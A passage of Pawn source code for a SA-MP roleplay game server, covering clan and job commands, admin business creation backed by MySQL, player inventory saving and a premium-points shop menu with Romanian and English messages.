stock GetFactionMembersOn2(fid) return Iter_Count(faction_players<fid>);
stock GetFactionMembersOn(playerid) return Iter_Count(faction_players<PlayerInfo[playerid][pMember]>);
stock GClanMemberss(id) {
	ClanMembers[id] = cache_num_rows();
	return true;
}

stock PutPlayerInVehicleEx(playerid,vehicleid,seatid) {
	enterVehicle[playerid] = true;
	Exception[playerid] = 2;
	PutPlayerInVehicle(playerid,vehicleid,seatid);
	return true;
}
stock RemovePlayerFromVehicleEx(playerid) {
	RemovePlayerFromVehicle(playerid);
	return true;
}

cmd:clanstats(playerid) {
	if(!PlayerInfo[playerid][pClan]) return true;

	SendClientMessage(playerid, 0x50B32DFF, "----");
	SCMf(playerid, -1, "{50B32D}> {FFFFFF}Days in clan: {50B32D}%d", PlayerInfo[playerid][pClanDays]);
	SCMf(playerid, -1, "{50B32D}> {FFFFFF}Money deposit in clan: {50B32D}$%s", FormatNumber(PlayerInfo[playerid][pClanMoney]));
	SCMf(playerid, -1, "{50B32D}> {FFFFFF}Premium Points deposit in clan: {50B32D}%d", PlayerInfo[playerid][pClanPP]);
	SendClientMessage(playerid, 0x50B32DFF, "----");
	return true;
}

cmd:jobgoal(playerid) {
	SendClientMessage(playerid, COLOR_TEAL, "-- Job Goal --");
	va_SendClientMessage(playerid, -1, ">> Ai participat cu $%s la acest job goal.", FormatNumber(PlayerInfo[playerid][pJobGoal]));
	va_SendClientMessage(playerid, -1, ">> Vei primi %d b-points la finalizarea acestui goal.", PlayerInfo[playerid][pJobGoal]/5000);
	return SendClientMessage(playerid, COLOR_TEAL, "----");
}

cmd:buyfightstyle(playerid, params[]) {
	if InInterior[playerid] != BUSINESS_INTERIOR *then return true;
	if(BizzInfo[InInteriorID[playerid]][bType] != 13) return SendClientMessage(playerid, -1, "You are not at gym.");
	ShowPlayerDialog(playerid,DIALOG_GYM,DIALOG_STYLE_LIST,"SERVER: Fighting Styles","Boxing ($300,000)\nKung Fu ($500,000)\nKnee Head ($500,000)\nGrab & Kick ($500,000)\nElbow ($500,000)\nDefault ($100,000)","Select","Cancel");
	return true; 
}

enum x_InterB {
	Float:e_BIZZ_POS[3],
	e_BIZZ_INTERIOR,
	e_BIZZ_STATIC
}

public OnPlayerShootDynamicObject(playerid, weaponid, objectid, Float:x, Float:y, Float:z) {
	if(attack_gift(playerid, weaponid, objectid)) return true;
	return true;
}

new Float:bInteriorPos[21][x_InterB] = {
	{{0.0, 0.0,0.0}, 0, 0},
	{{2305.0696,-15.9066,26.7422}, 0, 0}, // bank
	{{285.6762,-86.3199,1001.5229}, 4, 0}, // gun shop
	{{493.3968,-24.8437,1000.6797}, 17, 0}, // club
	{{-794.9601,489.4305,1376.1953}, 1, 0}, // restaurant
	{{-100.3542,-25.0326,1000.7188}, 3, 0}, // sexshop
	{{-25.9517,-187.7610,1003.5469}, 17, 0}, // 24/7
	{{207.6548,-110.4792,1005.1328}, 15, 0}, // clothes
	{{363.0403,-75.3009,1001.5078}, 10, 0}, // burger
	{{2234.0684,1714.1119,1012.3456}, 1, 0}, // casino
	{{0.0, 0.0, 0.0}, 0, 1}, // cnn
	{{0.0, 0.0, 0.0}, 0, 1}, // rent moto
	{{0.0, 0.0, 0.0}, 0, 1}, // rent car
	{{772.3022,-4.8968,1000.7288}, 5, 0}, // GYN
	{{0.0, 0.0, 0.0}, 0, 1}, // Car color
	{{0.0, 0.0, 0.0}, 0, 1}, // Paintball
	{{0.0, 0.0, 0.0}, 0, 1}, // Gas station
	{{0.0, 0.0, 0.0}, 0, 1}, // Race arena
	{{0.0, 0.0, 0.0}, 0, 1}, // PNS
	{{372.2865,-133.5243,1001.4922}, 5, 0}, // pizza
	{{0.0, 0.0, 0.0}, 0, 1} // Tunning
};

cmd:createbiz(playerid, params[]) {
    if(!IsAdmin(playerid, 7)) return true;
    new type, value, level;
    if(sscanf(params, "iii", type, value, level)) {
        SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/createbiz <type> <value> <level>");
        SendClientMessage(playerid, -1, "Types: Banca (1), Gun Shop (2), Club (3), Restaurant (4), Sex shop (5), 24/7 (6), Binco (7), Burger (8), Casino (9)");
        SendClientMessage(playerid, -1, "CNN (10), Rent Moto (11), Rent Car (12), GYM (13), Car Color (14), Paintball (15), Gas Station (16), Race Arena (17), PNS (18), Pizza (19)");
        SendClientMessage(playerid, -1, "Tunning (20)");
        return true;
    }
    if(type<=0||type>20) return SendClientMessage(playerid, COLOR_GREY, "Invalid type!");

    GetPlayerPos(playerid, pPos[playerid][0], pPos[playerid][1], pPos[playerid][2]);

    gQuery[0] = EOS;
    mysql_format(SQL, gQuery, sizeof(gQuery), "INSERT INTO `bizz` (`EntranceX`, `EntranceY`, `EntranceZ`, `ExitX`, `ExitY`, `ExitZ`, `LevelNeeded`, `BuyPrice`, `Type`, `Interior`, `Static`, `Message`) VALUES ('%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%d', '%d', '%d', '%s')",
    pPos[playerid][0], pPos[playerid][1], pPos[playerid][2], bInteriorPos[type][e_BIZZ_POS][0], bInteriorPos[type][e_BIZZ_POS][1], bInteriorPos[type][e_BIZZ_POS][2], level, value, type, bInteriorPos[type][e_BIZZ_INTERIOR], bInteriorPos[type][e_BIZZ_STATIC], BizzName[type-1]);
    mysql_tquery(SQL, gQuery, "InsertBizz", "iiii", playerid, level, value, type);
    bussines++;
    return true;
}

redist::InsertBizz(playerid, level, value, type) {
	new idd = cache_insert_id();
	gQuery[0] = EOS;
    if(type == 17) {
        mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `bizz` SET `Gas`='%d' WHERE `ID`='%d'", 1, idd);
        mysql_tquery(SQL, gQuery, "", "");
        BizzInfo[idd][bGas] = 1;
    }
    BizzInfo[idd][bID] = idd;
    BizzInfo[idd][bExitX] = bInteriorPos[type][e_BIZZ_POS][0]; BizzInfo[idd][bExitY] = bInteriorPos[type][e_BIZZ_POS][1]; BizzInfo[idd][bExitZ] = bInteriorPos[type][e_BIZZ_POS][2];
    BizzInfo[idd][bEntranceX] = pPos[playerid][0];
    BizzInfo[idd][bEntranceY] = pPos[playerid][1];
    BizzInfo[idd][bEntranceZ] = pPos[playerid][2];
    strmid(BizzInfo[idd][bMessage], BizzName[type-1], 0, 30);
    BizzInfo[idd][bBuyPrice] = value;
    BizzInfo[idd][bLevel] = level;
    BizzInfo[idd][bVirtual] = idd;
    BizzInfo[idd][bType] = type;
    BizzInfo[idd][bInterior] = bInteriorPos[type][e_BIZZ_INTERIOR];
    BizzInfo[idd][bStatic] = bInteriorPos[type][e_BIZZ_STATIC];
    LoadGPS(type, idd);

    switch(BizzInfo[idd][bType]) {
        case 1: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],52,0,-1,0,-1,500.0); // banca
        case 2: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],6,0,-1,0,-1,500.0); // gun shop
        case 3: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],49,0,-1,0,-1,500.0); // club
        case 4: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],50,0,-1,0,-1,500.0); // restaurant
        case 5: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],38,0,-1,0,-1,500.0); // sexshop
        case 6: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],17,0,-1,0,-1,500.0); // 24/7
        case 7: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],45,0,-1,0,-1,500.0); // binco
        case 8: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],10,0,-1,0,-1,500.0); // burger
        case 9: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],25,0,-1,0,-1,500.0); // casino
        case 10: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],16,0,-1,0,-1,500.0); // cnn
        case 12: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],55,0,-1,0,-1,500.0); // car
        case 13: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],54,0,-1,0,-1,500.0); // GYM
        case 14: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],63,0,-1,0,-1,500.0); // car color
        case 15: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],23,0,-1,0,-1,500.0); // paintball
        case 16: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],27,0,-1,0,-1,500.0); // gas station
        case 17: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],53,0,-1,0,-1,500.0); // race
        case 18: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],63,0,-1,0,-1,500.0); // pns
        case 19: CreateDynamicMapIcon(BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ],29,0,-1,0,-1,500.0); // pizza
    }
    mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `bizz` SET `Virtual`='%d' WHERE `ID`='%d'", idd, idd);
    mysql_tquery(SQL, gQuery, "", "");

	switch(BizzInfo[idd][bType]) {
		case 15: BizzInfo[idd][bPickup] = CreateDynamicPickup(1254, 23, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ]);
		case 17: BizzInfo[idd][bPickup] = CreateDynamicPickup(19134, 23, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ]);
		case 18: BizzInfo[idd][bPickup] = CreateDynamicPickup(1318, 23, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ]+1.0);
		default: BizzInfo[idd][bPickup] = CreateDynamicPickup(1239, 23, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ]);
	}
	UpdateLabel(2,idd);
    LoadGPS(BizzInfo[idd][bType], idd);
	PickupInfo[BizzInfo[idd][bPickup]][pkID] = idd;
	PickupInfo[BizzInfo[idd][bPickup]][pkType] = 2;
	format(gString, 128, "* Admin %s a creat un bizz %s, $%s si level %d.", GetName(playerid), BizzInfo[idd][bMessage], FormatNumber(BizzInfo[idd][bBuyPrice]), BizzInfo[idd][bLevel]);
	SendAdminMessage(COLOR_YELLOW, gString, 6);
	return true;
}
redist::SetPlayerFreeze(playerid, time) {
	UnFreezeTimer[playerid] = gettime()+time;
	TogglePlayerControllable(playerid, false);
	return true;
}

save_crates(playerid) return _query("UPDATE `users` SET `Crates`='%i %i %i %i %i %i %i %i %i %i %i' WHERE `id`='%d'", PlayerInfo[playerid][pCrates][0],PlayerInfo[playerid][pCrates][1],PlayerInfo[playerid][pCrates][2],PlayerInfo[playerid][pCrates][3], PlayerInfo[playerid][pCrates][4], PlayerInfo[playerid][pCrates][5], PlayerInfo[playerid][pCrates][6], PlayerInfo[playerid][pCrates][7], PlayerInfo[playerid][pCrates][8], PlayerInfo[playerid][pCrates][9], PlayerInfo[playerid][pCrates][10], PlayerInfo[playerid][pSQLID]);
save_tickete(playerid) return _query("UPDATE `users` SET `Tickets`='%i %i %i %i %i %i %i' WHERE `id`='%d'", PlayerInfo[playerid][pTickets][0],PlayerInfo[playerid][pTickets][1], PlayerInfo[playerid][pTickets][2],PlayerInfo[playerid][pTickets][3], PlayerInfo[playerid][pTickets][4],PlayerInfo[playerid][pTickets][5], PlayerInfo[playerid][pTickets][6], PlayerInfo[playerid][pSQLID]);
save_neon_tickets(playerid) return _query("UPDATE `users` SET `NeonTickets`='%i %i %i %i %i %i' WHERE `id`='%d'", PlayerInfo[playerid][pNeonTickets][0],PlayerInfo[playerid][pNeonTickets][1], PlayerInfo[playerid][pNeonTickets][2],PlayerInfo[playerid][pNeonTickets][3], PlayerInfo[playerid][pNeonTickets][4],PlayerInfo[playerid][pNeonTickets][5], PlayerInfo[playerid][pSQLID]);
save_vouchers(playerid) return _query("UPDATE `users` SET `Voucher`='%i %i %i %i %i' WHERE `id`='%i'", PlayerInfo[playerid][pVoucher][0],PlayerInfo[playerid][pVoucher][1],PlayerInfo[playerid][pVoucher][2],PlayerInfo[playerid][pVoucher][3],PlayerInfo[playerid][pVoucher][4], PlayerInfo[playerid][pSQLID]);

save_accesories(playerid) {
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Accessories`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `id`='%i'", 
	PlayerInfo[playerid][pAccessories][0],
	PlayerInfo[playerid][pAccessories][1],
	PlayerInfo[playerid][pAccessories][2],
	PlayerInfo[playerid][pAccessories][3],
	PlayerInfo[playerid][pAccessories][4],
	PlayerInfo[playerid][pAccessories][5],
	PlayerInfo[playerid][pAccessories][6],
	PlayerInfo[playerid][pAccessories][7],
	PlayerInfo[playerid][pAccessories][8],
	PlayerInfo[playerid][pAccessories][9],
	PlayerInfo[playerid][pAccessories][10],
	PlayerInfo[playerid][pAccessories][11],
	PlayerInfo[playerid][pAccessories][12],
	PlayerInfo[playerid][pAccessories][13],
	PlayerInfo[playerid][pAccessories][14],
	PlayerInfo[playerid][pAccessories][15],
	PlayerInfo[playerid][pAccessories][16],
	PlayerInfo[playerid][pAccessories][17],
	PlayerInfo[playerid][pAccessories][18],
	PlayerInfo[playerid][pAccessories][19],
	PlayerInfo[playerid][pAccessories][20],
	PlayerInfo[playerid][pAccessories][21],
	PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
}

cmd:shop(playerid, params[]) {
	gString[0] = (EOS);
	format(gString, sizeof(gString), "Shop Type\tItem\n{FFEA3B}[+] Shop Info{FFFFFF}\nNormal Shop\t20 items\nVip Cars\t11 items\nExtra Packs\t3 items\nCustom House Ticket\t{%s}5000 premium points\n{FFFFFF}Account upgrade\t10 item", PlayerInfo[playerid][pPremiumPoints]<5000?"98ff5c":"ff5c5c");
	ShowPlayerDialog(playerid, DIALOG_SHOPMENU, DIALOG_STYLE_TABLIST_HEADERS, "Shop Menu", gString, "Select", "Cancel");
	return true;
}

redist::ShowShop(playerid) {
	new gold = PlayerInfo[playerid][pPremiumPoints], szDialog[2000]; gString[0] = (EOS);
	switch(ShopType[playerid]) {
	    case 0: ShowPlayerDialog(playerid, DIALOG_SHOP, DIALOG_STYLE_MSGBOX, "Shop: Info", "Informati despre punctele premium:\n\nCum obtin punctele premium?\nPunctele premium se obtin prin 2 modalitati:\n1.Donare(Poti face o donatie pentru sustinera comunitati pe (/panel), Categoria Donatie)\n2.Poti castiga puncte premium zilnic pe joc la evenimente sau la diferite actiuni. (Ex: /buylevel, Quest special, Questuri zilnice)", "Select", "Back");
	    case 1: {
	    	SCMf(playerid, COLOR_LGREEN, "SHOP: You selected the 'Normal Shop' category and %d premium points.", PlayerInfo[playerid][pPremiumPoints]);
	    	strcat(szDialog, "#\tType\tPrice\n");
			strcat(szDialog, gold >= 300?"{FFFFFF}1.\tClan\t{98ff5c}300 premium points\n":"{FFFFFF}1.\tClan\t{ff5c5c}300 premium points\n");
			strcat(szDialog, gold >= 30?"{FFFFFF}2.\tClear 10 FP\t{98ff5c}30 premium points\n":"{FFFFFF}2.\tClear 10 FP\t{ff5c5c}30 premium points\n");
			strcat(szDialog, gold >= 200?"{FFFFFF}3.\tChange nickname\t{98ff5c}200 premium points\n":"{FFFFFF}3.\tChange nickname\t{ff5c5c}200 premium points\n");	
			strcat(szDialog, gold >= 40?"{FFFFFF}4.\tHidden color\t{98ff5c}40 premium points\n":"{FFFFFF}4.\tHidden color\t{ff5c5c}40 premium points\n");	
			strcat(szDialog, gold >= 40?"{FFFFFF}5.\tVehicle slot\t{98ff5c}40 premium points\n":"{FFFFFF}5.\tVehicle slot\t{ff5c5c}40 premium points\n");	
			strcat(szDialog, gold >= 150?"{FFFFFF}6.\tClear 1 warn\t{98ff5c}150 premium points\n":"{FFFFFF}6.\tClear 1 warn\t{ff5c5c}150 premium points\n");	
			strcat(szDialog, gold >= 40?"{FFFFFF}7.\tMP3 Player\t{98ff5c}40 premium points\n":"{FFFFFF}7.\tMP3 Player\t{ff5c5c}40 premium points\n");	
			strcat(szDialog, gold >= 100?"{FFFFFF}8.\tiPhone\t{98ff5c}100 premium points\n":"{FFFFFF}8.\tiPhone\t{ff5c5c}100 premium points\n");
			strcat(szDialog, gold >= 55?"{FFFFFF}9.\tHouse Radio\t{98ff5c}55 premium points\n":"{FFFFFF}9.\tHouse Radio\t{ff5c5c}55 premium points\n");
			strcat(szDialog, gold >= 55?"{FFFFFF}10.\tBusiness Radio\t{98ff5c}55 premium points\n":"{FFFFFF}10.\tBusines Radio\t{ff5c5c}55 premium points\n");
			strcat(szDialog, gold >= 55?"{FFFFFF}11.\tRare Voucher (50 PP)\t{98ff5c}55 premium points\n":"{FFFFFF}11.\tRare Voucher (50 PP)\t{ff5c5c}55 premium points\n");
			strcat(szDialog, gold >= 110?"{FFFFFF}12.\tEpic Voucher (100 PP)\t{98ff5c}110 premium points\n":"{FFFFFF}12.\tEpic Voucher (100 PP)\t{ff5c5c}110 premium points\n");
			strcat(szDialog, gold >= 525?"{FFFFFF}13.\tLegendary Voucher (500 PP)\t{98ff5c}525 premium points\n":"{FFFFFF}13.\tLegendary Voucher (500 PP)\t{ff5c5c}525 premium points\n");
			strcat(szDialog, gold >= 300?"{FFFFFF}14.\tClear Faction History\t{98ff5c}300 premium points\n":"{FFFFFF}14.\tClear Faction History\t{ff5c5c}300 premium points\n");
			strcat(szDialog, gold >= 300?"{FFFFFF}15.\tRainbow Ticket\t{98ff5c}300 premium points\n":"{FFFFFF}15.\tRainbow Ticket\t{ff5c5c}300 premium points\n");
			strcat(szDialog, gold >= 300?"{FFFFFF}16.\tVIP Vehicle Ticket\t{98ff5c}300 premium points\n":"{FFFFFF}16.\tVIP Vehicle Ticket\t{ff5c5c}300 premium points\n");
			strcat(szDialog, gold >= 260?"{FFFFFF}17.\tMythic Voucher (250 PP)\t{98ff5c}260 premium points\n":"{FFFFFF}17.\tMythic Voucher (250 PP)\t{ff5c5c}260 premium points\n");
			strcat(szDialog, gold >= 1030?"{FFFFFF}18.\tMillionaries Voucher (1000 PP)\t{98ff5c}1030 premium points\n":"{FFFFFF}18.\tMillionaries Voucher (1000 PP)\t{ff5c5c}1030 premium points\n");
			strcat(szDialog, gold >= 200?"{FFFFFF}19.\tCustom Number\t{98ff5c}200 premium points\n":"{FFFFFF}19.\tCustom Number\t{ff5c5c}200 premium points\n");
			ShowPlayerDialog(playerid, DIALOG_SHOP, DIALOG_STYLE_TABLIST_HEADERS, "Shop: Normal", szDialog, "Select", "Back");
		}
		case 2: {
			if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti achizitiona un vehicul daca nu detii minim nivel 3.");
			SCMf(playerid, COLOR_LGREEN, "SHOP: You selected the 'Vip Cars' category and %d premium points.", PlayerInfo[playerid][pPremiumPoints]);
			strcat(szDialog, "#\tType\tPrice\n");
			new stocks[30] = {"{ff5c5c}out of stock{FFFFFF}"};
			if(ServerStock[0]) format(stocks, 25, "%d stock", ServerStock[0]);
			format(gString, 128, "{FFFFFF}1.\tInfernus Premium (%s)\t{%s}2500 premium points\n", stocks, gold >= 2500?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
			strcat(szDialog, gold >= 400?"{FFFFFF}2.\tHotring Race A\t{98ff5c}400 premium points\n":"{FFFFFF}2.\tHotring Race A\t{ff5c5c}400 premium points\n");	
			strcat(szDialog, gold >= 400? "{FFFFFF}3.\tHotring Race B\t{98ff5c}400 premium points\n":"{FFFFFF}3.\tHotring Race B\t{ff5c5c}400 premium points\n");
			strcat(szDialog, gold >= 400?"{FFFFFF}4.\tHotring Race C\t{98ff5c}400 premium points\n":"{FFFFFF}4.\tHotring Race C\t{ff5c5c}400 premium points\n");	
			strcat(szDialog, gold >= 450?"{FFFFFF}5.\tStreach\t{98ff5c}450 premium points\n":"{FFFFFF}5.\tStreach\t{ff5c5c}450 premium points\n");	
			strcat(szDialog, gold >= 300?"{FFFFFF}6.\tSparrow\t{98ff5c}300 premium points\n":"{FFFFFF}6.\tSparrow\t{ff5c5c}300 premium points\n");	
			strcat(szDialog, gold >= 500?"{FFFFFF}7.\tMaverick\t{98ff5c}500 premium points\n":"{FFFFFF}7.\tMaverick\t{ff5c5c}500 premium points\n");	
		    strcat(szDialog, gold >= 800?"{FFFFFF}8.\tShamal\t{98ff5c}800 premium points\n":"{FFFFFF}8.\tShamal\t{ff5c5c}800 premium points\n");
		    if(ServerStock[1]) format(stocks, 25, "%d stock", ServerStock[1]);
			format(gString, 128, "{FFFFFF}9.\tMonster (%s)\t{%s}1000 premium points\n", ServerStock[1]?stocks:("{ff5c5c}out of stock{FFFFFF}"), gold >= 10000?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
		    if(ServerStock[2]) format(stocks, 25, "%d stock", ServerStock[2]);
			format(gString, 128, "{FFFFFF}10.\tNRG Premium (%s)\t{%s}1500 premium points\n", ServerStock[2]?stocks:("{ff5c5c}out of stock{FFFFFF}"), gold >= 1500?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
		    if(ServerStock[3]) format(stocks, 25, "%d stock", ServerStock[3]);
			format(gString, 128, "{FFFFFF}11.\tBullet Premium (%s)\t{%s}2000 premium points\n", ServerStock[3]?stocks:("{ff5c5c}out of stock{FFFFFF}"), gold >= 2000?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
		    if(ServerStock[4]) format(stocks, 25, "%d stock", ServerStock[4]);
			format(gString, 128, "{FFFFFF}12.\tSultan Premium (%s)\t{%s}1000 premium points\n", ServerStock[4]?stocks:("{ff5c5c}out of stock{FFFFFF}"), gold >= 1000?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
		    if(ServerStock[5]) format(stocks, 25, "%d stock", ServerStock[5]);
			format(gString, 128, "{FFFFFF}13.\tTurismo Premium (%s)\t{%s}869 premium points\n", ServerStock[5]?stocks:("{ff5c5c}out of stock{FFFFFF}"), gold >= 869?("98ff5c"):("ff5c5c"));
			strcat(szDialog, gString);
		    ShowPlayerDialog(playerid, DIALOG_SHOP, DIALOG_STYLE_TABLIST_HEADERS, "Shop: VIP Cars", szDialog, "Select", "Back");
		}
		case 3: {
			SCMf(playerid, COLOR_LGREEN, "SHOP: You selected the 'Extra Packs' category and %d premium points.", PlayerInfo[playerid][pPremiumPoints]);
			strcat(szDialog, "#\tType\tPrice\n");
			strcat(szDialog, gold >= 1000?"{FFFFFF}1.\tStarter Pack\t{98ff5c}1000 premium points\n":"{FFFFFF}1.\tStarter Pack\t{ff5c5c}1000 premium points\n");
			strcat(szDialog, gold >= 850?"{FFFFFF}2.\tVoucher Pack\t{98ff5c}850 premium points\n":"{FFFFFF}2.\tVoucher Pack\t{ff5c5c}850 premium points\n");
			strcat(szDialog, gold >= 500?"{FFFFFF}3.\tVehicle Pack\t{98ff5c}500 premium points\n":"{FFFFFF}3.\tVehicle Pack\t{ff5c5c}500 premium points\n");	
		    ShowPlayerDialog(playerid, DIALOG_SHOP, DIALOG_STYLE_TABLIST_HEADERS, "Shop: Extra Packs", szDialog, "Select", "Back");
		}
		case 4: SendClientMessage(playerid, COLOR_LGREEN, "Pentru mai multe detalii acceseaza topicul 'Custom House' de pe /forum.");
		case 5: {
			SCMf(playerid, COLOR_LGREEN, "SHOP: You selected the 'Account Upgrade' category and %d premium points.", PlayerInfo[playerid][pPremiumPoints]);
			strcat(szDialog, "#\tType\tPrice\n");
			strcat(szDialog, gold >= 500 && PlayerInfo[playerid][pLevel] >= 100 && PlayerInfo[playerid][pExp] >= 500 && PlayerInfo[playerid][pBPoints] >= 3000 ?"{FFFFFF}1.\tReborn\t{98ff5c}500 premium points / level 100+ / 500 rp / 3000 bp\n":"{FFFFFF}1.\tReborn\t{ff5c5c}500 premium points / level 100+ / 500 rp / 3000 bp\n");
			strcat(szDialog, gold >= 500 && PlayerInfo[playerid][pLevel] >= 100 && PlayerInfo[playerid][pExp] >= 400 && PlayerInfo[playerid][pBPoints] >= 5000 ?"{FFFFFF}2.\tReborn 2\t{98ff5c}500 premium points / level 100+ / 400 rp / 5000 bp\n":"{FFFFFF}2.\tReborn 2\t{ff5c5c}500 premium points / level 100+ / 400 rp / 5000 bp\n");
			strcat(szDialog, gold >= 500 && PlayerInfo[playerid][pLevel] >= 100 && PlayerInfo[playerid][pExp] >= 300 && PlayerInfo[playerid][pBPoints] >= 8000 ?"{FFFFFF}3.\tReborn 3\t{98ff5c}500 premium points / level 100+ / 300 rp / 8000 bp\n":"{FFFFFF}3.\tReborn 3\t{ff5c5c}500 premium points / level 100+ / 300 rp / 8000 bp\n");
			strcat(szDialog, gold >= 500 && PlayerInfo[playerid][pLevel] >= 100 && PlayerInfo[playerid][pExp] >= 200 && PlayerInfo[playerid][pBPoints] >= 10000 ?"{FFFFFF}4.\tReborn 4\t{98ff5c}500 premium points / level 100+ / 200 rp / 10000 bp\n":"{FFFFFF}4.\tReborn 4\t{ff5c5c}500 premium points / level 100+ / 200 rp / 10000 bp\n");
			strcat(szDialog, gold >= 500 && PlayerInfo[playerid][pLevel] >= 100 && PlayerInfo[playerid][pExp] >= 100 && PlayerInfo[playerid][pBPoints] >= 15000 ?"{FFFFFF}5.\tReborn 5\t{98ff5c}500 premium points / level 100+ / 100 rp / 15000 bp\n":"{FFFFFF}5.\tReborn 5\t{ff5c5c}500 premium points / level 100+ / 100 rp / 15000 bp\n");
			strcat(szDialog, gold >= 150?"{FFFFFF}6.\tPremium Account\t{98ff5c}150 premium points\n":"{FFFFFF}6.\tPremium Account\t{ff5c5c}150 premium points\n");	
			strcat(szDialog, "{FFFFFF}7.\tPremium Account Plus\t{98FF5C}2 miliards {FFFFFF}& {D373FF}5000 BPoints\n");
			strcat(szDialog, gold >= 800?"{FFFFFF}8.\tVIP Account\t{98ff5c}800 premium points\n":"{FFFFFF}8.\tVIP Account\t{ff5c5c}800 premium points\n");
			strcat(szDialog, gold >= 500?"{FFFFFF}9.\tVIP Account Plus\t{98ff5c}500 premium points\n":"{FFFFFF}9.\tVIP Account Plus\t{ff5c5c}500 premium points\n");
			strcat(szDialog, gold >= 1337?"{FFFFFF}10.\tLegend\t{98ff5c}1337 premium points\n":"{FFFFFF}10.\tLegend\t{ff5c5c}1337 premium points\n");
			ShowPlayerDialog(playerid, DIALOG_SHOP, DIALOG_STYLE_TABLIST_HEADERS, "Shop: Account upgrade", szDialog, "Select", "Back");
		}
	}
	return true;
}
stock SetInteriorCamera(playerid) {
	new string[180];
	format(string, sizeof(string), "interior id: %d", SInterior[playerid]);
	PlayerTextDrawSetString(playerid, ShopTDs[0], string);
	PlayerTextDrawShow(playerid, ShopTDs[0]);
	new i = SInterior[playerid]-1;
	SetPlayerPos(playerid, InteriorPos[i][0], InteriorPos[i][1], InteriorPos[i][2]);
			
	switch(SInterior[playerid]) {																	
		case 1: SetPlayerCameraPos(playerid, 226.6298, 1292.9222, 1084.1265), SetPlayerCameraLookAt(playerid, 225.8987, 1292.2417, 1083.6882), SetPlayerInterior(playerid, 1);
		case 2: SetPlayerCameraPos(playerid, 2285.6091, -1134.0924, 1051.5907), SetPlayerCameraLookAt(playerid, 2284.9370, -1134.8314, 1051.4012), SetPlayerInterior(playerid, 11);
		case 3: SetPlayerCameraPos(playerid, 326.8593, 1477.6793, 1085.2574), SetPlayerCameraLookAt(playerid, 327.1747, 1478.6263, 1085.0721), SetPlayerInterior(playerid, 15);
		case 4: SetPlayerCameraPos(playerid, -51.7679, 1403.2477, 1086.7109), SetPlayerCameraLookAt(playerid, -51.3880, 1404.1694, 1086.4764), SetPlayerInterior(playerid, 8);
		case 5: SetPlayerCameraPos(playerid, 301.3609, 311.8316, 1003.6948), SetPlayerCameraLookAt(playerid, 301.7389, 310.9072, 1003.6548), SetPlayerInterior(playerid, 4);
		case 6: SetPlayerCameraPos(playerid, 2305.6182, -1211.9570, 1051.2274), SetPlayerCameraLookAt(playerid, 2306.5337, -1211.5588, 1050.8679), SetPlayerInterior(playerid, 6);
		case 7: SetPlayerCameraPos(playerid, 2234.6445, -1111.8185, 1051.3431), SetPlayerCameraLookAt(playerid, 2234.1465, -1110.9523, 1051.1779), SetPlayerInterior(playerid, 5);
		case 8: SetPlayerCameraPos(playerid, 2261.9775, -1133.6704, 1051.4977), SetPlayerCameraLookAt(playerid, 2262.1741, -1134.6493, 1051.3431), SetPlayerInterior(playerid, 10);
